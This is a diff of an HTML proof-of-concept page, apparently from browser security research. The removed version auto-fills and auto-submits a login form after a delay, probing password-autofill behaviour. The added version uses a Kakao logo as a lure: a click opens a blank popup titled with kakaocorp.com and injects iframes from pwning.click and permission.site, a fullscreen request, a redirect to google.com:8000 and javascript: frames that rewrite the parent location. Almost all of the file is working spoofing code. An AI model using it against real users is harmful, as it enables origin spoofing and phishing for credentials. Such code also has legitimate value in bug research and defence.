@@ -1,20 +1,21 @@
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<form id="form" action="poc.html#aa" method="GET">
-  <input type="text" id="loginUsername" autocomplete="username webauthn">
-  <input id="passwdfield" type="password" name="pwd" autocomplete="new-password" aria-autocomplete="list"/>
-  <input id="submitfield" type="submit" value="Submit">
-</form>
+<img id="button" src="https://t1.kakaocdn.net/kakaocorp/corp_thumbnail/Kakao.png">
 
 <script>
-  window.onload = () => {
-    if(window.location.hash == "#aa"){
+var s="https://kakaocorp.com";
+var button=document.getElementById("button");
+button.href=s;
+var qwin;
+button.onclick=function(e){
 
-    } else {
-      setTimeout(() => {
-        document.getElementById("loginUsername").focus();
-        document.getElementById("loginUsername").value = "aaaaa";
-        document.getElementById("form").submit();
-      }, 2000);
-    }
-  }
+	// Open a window without triggering the alert
+	qwin=open('',"toolbar=no,height=350,width=305");
+	setTimeout(function(){
+		qwin.document.title=s;
+		qwin.document.body.innerHTML=`<iframe src=https://pwning.click/permission.php><meta http-equiv="refresh" content="111;url=https://www.google.com:8000"><button onclick = "document.documentElement.requestFullscreen()">start full screen</button> <embed src=https://permission.site><iframe src="javascript:setInterval(function(){parent.location='javascript:parent.location='https://google.com:8000';alert(1)}, 10)"/></iframe>
+		 <iframe src="javascript:setInterval(function(){alert(top.document.location)}, 1000000)"/></iframe><embed src=https://permission.site>
+		
+		`;
+	},333);
+	return false;
+}
 </script>
